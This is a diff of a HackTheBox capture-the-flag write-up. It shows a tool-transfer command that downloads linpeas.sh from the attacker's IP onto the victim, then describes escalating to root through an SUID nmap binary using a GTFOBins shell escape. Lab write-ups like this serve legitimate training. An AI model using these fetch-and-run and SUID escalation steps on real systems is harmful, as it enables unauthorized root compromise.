@@ -56,7 +56,7 @@ I look around a bit and `cd /home` directory and do a `ls` and see what's there.
 Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh<br>
 I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine.<br>
 I use `python3 -m http.server 80` to get the server up and running.<br>
-On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox.<br>
+On the victim machine ill be in the <em><strong>/tmp</em></strong> directory and use 'wget://10.10.14.10/linpeas.sh' which is my attacking machines ip from HackTheBox. 
 The file gets transferred over no problem. I use `chmod +x linpeas.sh` making it an executable file.<br>
 I use `./linpeas.sh` and it runs no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
 
@@ -66,15 +66,15 @@ I use `./linpeas.sh` and it runs no problem. We get back a lot of results. Sever
 
 ![image](https://user-images.githubusercontent.com/110210595/185814242-ca1ef7ad-efb5-47bd-8b56-bedfb902f6c7.png)
 
-the <em><strong>/usr/bin/nmap suid</em></strong><br>
+<em><strong>/usr/bin/nmap suid</em></strong><br>
 I head over to https://gtfobins.github.io/ and search for <em><strong>nmap</em></strong><br>
-I cd /usr/bin where the suid is located.<br>
+I 'cd /usr/bin' where the suid is located.<br>
 I start off with shell code (a) and nothing happened. So I keep going down the list.<br>
 Shell (b) worked!
 
 ![image](https://user-images.githubusercontent.com/110210595/185814276-6c882b38-ce84-4183-a828-49b30153bc7a.png)
 
-we can now cd /root and see what is there which is the <em><strong>root.txt</em></strong> flag!<br>
+we can now 'cd /root' and see what is there which is the <em><strong>root.txt</em></strong>flag!<br>
 we have successfully rooted this box!
 
 ![image](https://user-images.githubusercontent.com/110210595/185814294-98c871d4-6e47-46cd-b258-79796039924c.png)
